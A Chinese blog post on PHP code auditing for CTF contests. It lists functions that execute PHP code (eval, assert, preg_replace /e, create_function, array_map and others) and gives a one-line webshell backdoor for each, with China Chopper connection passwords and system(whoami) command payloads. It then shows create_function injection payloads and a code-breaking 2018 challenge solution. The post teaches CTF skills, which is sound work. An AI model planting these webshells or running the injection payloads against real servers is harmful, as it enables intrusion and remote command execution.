> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ocZUYpaPBsSylN75k8vbAw)

前言
--

Java 代码审计还会继续，准备材料和代码很耗费时间，所以这一节先不说 java 的代码审计。又因为过段时间需要参加一个全网性的线下 CTF，所以这段时间需要特地研究一下 CTF 的相关题目。自大学之后我基本没有参加 CTF 比赛了，好多东西都有点忘记了，趁这个机会我好好捡起来重新学习一下。

在 CTF 题目中，几乎都会有 PHP 的代码审计，PHP 基本是 CTFer 必备的一个技能点，那么今天我来简单说下 php 中 create_function 的利用方式，同时也引用一下一道真实的 CTF 题目作为讲解。

常用的代码执行函数
---------

对于一个有经验的赛棍来说，php 进行**代码执行** (注意：我这里说的是代码执行，不是命令执行) 的函数有

1.  `eval` 函数
    
    ```
    传入的参数必须为PHP代码，既需要以分号结尾。#命令執行：cmd=system(whoami);#菜刀连接密码：cmd<?php @eval($_POST['cmd']);?>
    ```
    
2.  `assert` 函数
    
    ```
    #assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。#命令執行：cmd=system(whoami)#菜刀连接密码：cmd<?php @assert($_POST['cmd'])?>
    ```
    
3.  `preg_replace` 函数
    
    ```
    #preg_replace('正则规则','替换字符'，'目标字符')#执行命令和上传文件参考assert函数(不需要加分号)。#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。preg_replace("/test/e",$_POST["cmd"],"jutst test");
    ```
    
4.  `create_function` 函数
    
    ```
    #创建匿名函数执行代码#执行命令和上传文件参考eval函数(必须加分号)。#菜刀连接密码：cmd$func =create_function('',$_POST['cmd']);$func();
    ```
    
5.  `array_map` 函数
    
    ```
    #array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。#命令执行http://localhost/123.php?func=system   cmd=whoami#菜刀连接http://localhost/123.php?func=assert   密码：cmd$func=$_GET['func'];$cmd=$_POST['cmd'];$array[0]=$cmd;$new_array=array_map($func,$array);echo $new_array;
    ```
    
6.  `call_user_func` 函数
    
    ```
    #传入的参数作为assert函数的参数#cmd=system(whoami)#菜刀连接密码：cmdcall_user_func("assert",$_POST['cmd']);
    ```
    
7.  `call_user_func_array` 函数
    
    ```
    #将传入的参数作为数组的第一个值传递给assert函数#cmd=system(whoami)#菜刀连接密码：cmd$cmd=$_POST['cmd'];$array[0]=$cmd;call_user_func_array("assert",$array);
    ```
    
8.  `array_filter` 函数
    
    ```
    #用回调函数过滤数组中的元素：array_filter(数组,函数)#命令执行func=system&cmd=whoami#菜刀连接http://localhost/123.php?func=assert  密码cmd$cmd=$_POST['cmd'];$array1=array($cmd);$func =$_GET['func'];array_filter($array1,$func);
    ```
    
9.  `uasort` 函数
    
    ```
    #php环境>=<5.6才能用#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。#命令执行：http://localhost/123.php?1=1+1&2=eval($_GET[cmd])&cmd=system(whoami);#菜刀连接：http://localhost/123.php?1=1+1&2=eval($_POST[cmd])   密码：cmdusort($_GET,'asse'.'rt');
    ```
    

create_function 函数
------------------

适用范围：`PHP 4> = 4.0.1`，`PHP 5`，`PHP 7`

功能：根据传递的参数创建匿名函数，并为其返回唯一名称。

```
create_function(string $args,string $code)string $args 声明的函数变量部分string $code 执行的方法代码部分
```

案例：

```
<?php$newfunc = create_function('$a, $b', 'return "$a + $b = " . ($a + $b);');echo "function: " . $newfunc . "\n";echo $newfunc(3,4);
```

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7jiaurklqoBkShQ6wOgLCY1GJ5BZJJvQcUiaUnVibYkqTVFMBPBMDPiavEYDhMfFQOfD7icpjg7cUKk0Fg/640?wx_fmt=png)

可以看到，`create_function` 的第一个参数是匿名函数的参数名，第二个参数是函数里面的逻辑代码

### 如何利用 create_function 进行代码注入

```
<?php$id=$_GET['id'];$str2='echo  '.$a.'test'.$id.";";echo $str2;echo "<br/>";echo "==============================";echo "<br/>";$f1 = create_function('$a',$str2);echo "<br/>";echo "==============================";
```

在这个例子中，将`$str2`的参数带入到`create_function`中执行，那我们就需要闭合这个函数，然后注释接下来的语句就可以形成我们的 payload

`http://fx.com/create2.php?id=;};phpinfo();//`

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7jiaurklqoBkShQ6wOgLCY1GuicYoku11KkXCK8GqIQKwraRpzzrKxy019ZfBFZf7WlCs3zBV7u05Lg/640?wx_fmt=png)

上面匿名函数可能大家都看不明白，我把常用的函数声明的方式写出来

```
<?php//常规方法function func($a){  echo $a . 'test' . $_GET['id'] . ';';}//create2.php?id=;};phpinfo();// 注入后的代码function func($a){  echo $a . 'test';} phpinfo();//' . ';'  //形成代码注入}
```

code-breaking2018 中的一道题
-----------------------

```
<?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) {    show_source(__FILE__);} else {    $action('', $arg);}
```

这题十分简短精悍，特别看到`$action('', $arg);`就条件反射肯定是`create_function`，应该是需要找到一个在 [a-z0-9_] 之外的字符放置在函数前而不影响函数的调用，简单传入：

`http://127.0.0.1:8087/?action=%20system&arg=`

让页面报错了, fuzz 之后得到`\`, `\` 在 php 中是表示根命名空间就是整个代码就是`\create_function('', $arg);` 是可以运行的，arg 就用我们上面说到的方法。最后的 payload 就是`http://127.0.0.1/?action=\create_function&arg=}phpinfo();//`